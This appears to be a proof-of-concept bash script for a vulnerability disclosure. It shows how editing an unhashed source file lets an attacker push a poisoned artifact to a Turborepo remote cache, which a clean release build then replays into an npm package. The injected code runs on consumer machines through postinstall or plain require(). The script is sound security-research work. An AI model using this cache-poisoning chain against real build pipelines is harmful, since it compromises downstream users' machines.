#!/usr/bin/env bash
set -uo pipefail
cd /tmp/turbo-supply-chain

export TURBO_API="http://127.0.0.1:9099"
export TURBO_TOKEN="poc-write-token"
export TURBO_TEAM="team_poc"
RO="--remote-only --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM"
TGZ=/tmp/turbo-supply-chain/poc-widget-1.0.0.tgz

line(){ printf '\n========== %s ==========\n' "$1"; }
wipe_out(){ rm -rf packages/widget/dist packages/widget/postinstall.js .turbo packages/widget/.turbo; }

# fresh remote cache server
rm -rf /tmp/turbo-remote-store; rm -f /tmp/PWNED_CONSUMER.txt "$TGZ"
node remote-cache-server.mjs > /tmp/remote-cache.log 2>&1 &
SRV=$!; trap 'kill $SRV 2>/dev/null || true' EXIT
sleep 1
git checkout -- shared/banner.js 2>/dev/null

line "STEP 1  main: clean build -> push artifact to HTTP remote cache, sanity pack+install"
wipe_out
npx turbo run build $RO 2>&1 | grep -Ei 'cache (miss|hit)|Tasks:|executing' || true
( cd packages/widget && npm pack --silent >/dev/null 2>&1; mv poc-widget-1.0.0.tgz "$TGZ" )
rm -rf consumer/node_modules consumer/package-lock.json; rm -f /tmp/PWNED_CONSUMER.txt
echo "-- consumer installs the clean package (default consumer: scripts enabled) --"
( cd consumer && npm install "$TGZ" --ignore-scripts=false 2>&1 | grep -Ei 'postinstall|added|PWNED' || true )
echo "-- PWNED on consumer? $([ -f /tmp/PWNED_CONSUMER.txt ] && echo YES || echo no) --"

line "STEP 2  attacker branch: edit ONLY unhashed shared/banner.js, push poisoned artifact (same hash)"
cat > shared/banner.js <<'EOF'
const fs = require("node:fs"), os = require("node:os");
console.log("\x1b[31m[PWNED] code running on a CONSUMER machine via npm install (postinstall)\x1b[0m");
try { console.log("[PWNED] reading consumer $HOME ->", fs.readdirSync(os.homedir()).slice(0,3).join(", ")); } catch {}
fs.writeFileSync("/tmp/PWNED_CONSUMER.txt", "supply-chain: poisoned postinstall executed on consumer machine\n");
module.exports = { tagline: "the friendly widget" };
EOF
wipe_out
# fresh tree (no outputs) + remote:w forces execute then WRITE poisoned to remote cache
npx turbo run build --cache=remote:w --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM 2>&1 | grep -Ei 'cache|Tasks:|executing' || true

line "STEP 3  release pipeline on CLEAN main: pull from cache, then npm pack"
git checkout -- shared/banner.js
grep -q PWNED shared/banner.js && echo "  !! payload in source" || echo "  release source clean (no payload in shared/banner.js)"
wipe_out
npx turbo run build $RO 2>&1 | grep -Ei 'cache (hit|miss)|replay|Tasks:' || true
echo "-- the release job got a cache HIT and never rebuilt. Pack the restored outputs: --"
( cd packages/widget && npm pack --silent >/dev/null 2>&1; mv poc-widget-1.0.0.tgz "$TGZ" )
echo "-- poisoned postinstall.js that went into the tarball: --"
tar -xzO -f "$TGZ" package/postinstall.js | sed 's/^/    /'

line "STEP 4a  downstream consumer: npm install (postinstall vector)"
rm -rf consumer/node_modules consumer/package-lock.json; rm -f /tmp/PWNED_CONSUMER.txt
echo "-- consumer runs ONLY: npm install poc-widget   (default npm: scripts enabled) --"
( cd consumer && npm install "$TGZ" --ignore-scripts=false 2>&1 | grep -Ei 'postinstall|added|PWNED|reading' || true )
echo "-- PWNED via postinstall? $([ -f /tmp/PWNED_CONSUMER.txt ] && echo 'YES' || echo no) --"

line "STEP 4b  import-time vector: even with --ignore-scripts, require() runs poisoned code"
rm -rf consumer/node_modules consumer/package-lock.json; rm -f /tmp/PWNED_CONSUMER.txt
( cd consumer && npm install "$TGZ" --ignore-scripts 2>&1 | grep -Ei 'added' || true )
echo "-- consumer app does: const widget = require('poc-widget') --"
( cd consumer && node -e "require('poc-widget')" 2>&1 | grep -Ei 'PWNED|reading' || true )
echo
echo "-- RESULT --"
echo "-- PWNED on consumer machine (via plain require)? $([ -f /tmp/PWNED_CONSUMER.txt ] && echo 'YES - SUPPLY CHAIN COMPROMISE' || echo no) --"
[ -f /tmp/PWNED_CONSUMER.txt ] && { echo -n "   marker: "; cat /tmp/PWNED_CONSUMER.txt; }

line "SERVER ACCESS LOG"
sed 's/^/  [srv] /' /tmp/remote-cache.log

git checkout -- shared/banner.js
